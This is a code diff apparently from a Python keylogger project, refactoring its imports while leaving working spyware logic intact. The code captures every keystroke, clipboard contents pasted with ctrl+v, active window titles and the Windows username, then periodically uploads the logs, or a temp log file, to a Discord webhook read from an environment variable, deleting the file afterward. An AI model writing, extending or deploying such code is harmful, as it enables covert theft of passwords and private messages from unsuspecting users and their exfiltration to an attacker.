@@ -1,19 +1,19 @@
-import os
-import unicodedata
+from os import getlogin, getenv, environ, remove
+from unicodedata import name
 from threading import Timer
 from datetime import datetime
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from pynput.keyboard import Listener, Key
 from dotenv import load_dotenv
-import pyperclip
-import keyboard
-import win32gui
+from pyperclip import paste
+from keyboard import add_hotkey
+from win32gui import GetWindowText, GetForegroundWindow
 
 load_dotenv()
 
 current_window = None
 REPORT_INTERVAL = 120
-WEBHOOK_URL = os.getenv("WEBHOOK_URL")
+WEBHOOK_URL = getenv("WEBHOOK_URL")
 SPECIAL_KEYS = {
     Key.alt_l: "",
     Key.alt_r: "",
@@ -70,12 +70,12 @@ class Keylogger_KY8:
         self.log = ""
         self.start_time = now.strftime('%d/%m/%Y %H:%M')
         self.end_time = now.strftime('%d/%m/%Y %H:%M')
-        self.username = os.getlogin()
-        keyboard.add_hotkey("ctrl+v", self.copy_clipboard, suppress=False)
+        self.username = getlogin()
+        add_hotkey("ctrl+v", self.copy_clipboard, suppress=False)
 
     def get_active_window(self):
         try:
-            return win32gui.GetWindowText(win32gui.GetForegroundWindow())
+            return GetWindowText(GetForegroundWindow())
         except Exception:
             return "Unknown Window"
 
@@ -90,7 +90,7 @@ class Keylogger_KY8:
         self.log_window_change()
         try:
             key = key.char
-            unicodedata.name(key)
+            name(key)
         except (AttributeError, ValueError):
             if key in SPECIAL_KEYS:
                 key = SPECIAL_KEYS[key]
@@ -104,19 +104,19 @@ class Keylogger_KY8:
 
     def copy_clipboard(self):
         self.log_window_change()
-        self.log += f"\n[Clipboard]: {{\n{pyperclip.paste()}\n}}\n"
+        self.log += f"\n[Clipboard]: {{\n{paste()}\n}}\n"
 
     def report_to_webhook(self):
         webhook = DiscordWebhook(url=WEBHOOK_URL)
         if len(self.log) > 2000:
-                path = os.environ["temp"] + "\\log.txt"
+                path = environ["temp"] + "\\log.txt"
                 with open(path, 'w+') as file:
                     file.write(f"Username :{self.username} | Time: {self.end_time}\n\n")
                     file.write(self.log)
                 with open(path, 'rb') as f:
                     webhook.add_file(file=f.read(), filename='log.txt')
                 webhook.execute()
-                os.remove(path) 
+                remove(path) 
         else:
             if len(self.log) > 0:
                 embed = DiscordEmbed(title=f"Username :{self.username} | Time: {self.end_time}", description=self.log)
